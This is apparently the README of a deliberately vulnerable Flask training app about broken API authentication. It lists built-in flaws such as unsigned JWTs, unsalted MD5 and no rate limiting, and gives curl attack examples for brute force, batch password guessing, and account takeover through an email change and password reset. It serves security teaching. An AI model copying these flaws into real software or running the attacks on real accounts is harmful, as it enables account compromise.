# Insecure Flask API - Broken Authentication Demo

⚠️ **WARNING: This application is intentionally vulnerable and should NEVER be used in production!**

This Flask application demonstrates various authentication vulnerabilities from OWASP API Security Top 10 - API2:2023 Broken Authentication.

## Vulnerabilities Demonstrated

### 1. **No Rate Limiting** 
- Login endpoints have no rate limiting
- Enables brute force attacks
- GraphQL-style batch requests bypass any potential rate limiting

### 2. **Weak Password Policies**
- Accepts weak passwords (minimum 3 characters)
- No complexity requirements
- Default users have weak passwords (`password`, `123456`)

### 3. **Insecure Password Storage**
- Uses MD5 hashing (cryptographically broken)
- No salt used for password hashing
- Vulnerable to rainbow table attacks

### 4. **JWT Token Vulnerabilities**
- Uses `"alg":"none"` (no signature verification)
- Weak signing secret (`weak_secret`)
- No token expiration validation
- Tokens don't expire

### 5. **Sensitive Operations Without Verification**
- Email updates don't require password confirmation
- Critical account changes without re-authentication

### 6. **Credentials in URL Parameters**
- `/login_url` endpoint accepts credentials in GET parameters
- Credentials logged in server logs and browser history

### 7. **Insecure Password Reset**
- Password reset without proper email verification
- No confirmation tokens or secure workflows

## Installation & Setup

```bash
# Install dependencies
pip install flask pyjwt

# Run the insecure application
python insecure_api.py
```

The application will start on `http://localhost:5000`

## Test Users

| Username | Password | Email |
|----------|----------|-------|
| admin    | password | admin@example.com |
| victim   | 123456   | victim@example.com |

## API Endpoints

### Authentication
- `POST /login` - Login with credentials
- `POST /batch_login` - Batch login requests (bypasses rate limiting)
- `GET /login_url?username=X&password=Y` - Login via URL parameters

### Account Management
- `PUT /update_email` - Update email without password confirmation
- `POST /reset_password` - Reset password without verification

### Utility
- `GET /health` - Health check endpoint

## Attack Examples

### 1. Brute Force Attack (No Rate Limiting)
```bash
# Single requests - no rate limiting
for i in {1..100}; do
  curl -X POST http://localhost:5000/login \
    -H "Content-Type: application/json" \
    -d '{"username":"victim","password":"password'$i'"}'
done
```

### 2. Batch Attack (GraphQL-style)
```bash
curl -X POST http://localhost:5000/batch_login \
  -H "Content-Type: application/json" \
  -d '[
    {"username":"victim","password":"password"},
    {"username":"victim","password":"123456"},
    {"username":"victim","password":"qwerty"},
    {"username":"victim","password":"admin"},
    {"username":"victim","password":"letmein"}
  ]'
```

### 3. Account Takeover via Email Change
```bash
# Get a token first (with weak validation)
TOKEN=$(curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"123456"}' | jq -r '.token')

# Change email without password confirmation
curl -X PUT http://localhost:5000/update_email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# Now reset password using the new email
curl -X POST http://localhost:5000/reset_password \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","new_password":"hacked123"}'
```

### 4. Credentials in URL
```bash
# Credentials will be logged in server logs and browser history
curl "http://localhost:5000/login_url?username=admin&password=password"
```

### 5. JWT Token Manipulation
```bash
# Get a token
TOKEN=$(curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"123456"}' | jq -r '.token')

# The token uses "alg":"none" and can be manipulated
# Decode the token to see it's unsigned
echo $TOKEN | base64 -d
```

## Security Issues Summary

1. **Credential Stuffing** - No protection against automated attacks
2. **Brute Force** - No account lockout or rate limiting
3. **Weak Passwords** - Minimal password requirements
4. **Insecure Storage** - MD5 hashing without salt
5. **Token Issues** - Unsigned JWTs, no expiration
6. **Missing Re-authentication** - Sensitive operations without password confirmation
7. **Information Disclosure** - Credentials in URLs and logs
8. **Weak Cryptography** - Broken hashing algorithms

## Educational Purpose

This application is designed for:
- Security training and awareness
- Penetration testing practice
- Understanding authentication vulnerabilities
- Demonstrating why secure coding practices matter

## Next Steps

After exploring this vulnerable application, examine the secure implementation to understand proper authentication security measures.

---
**Remember: NEVER deploy this code to production or any publicly accessible environment!**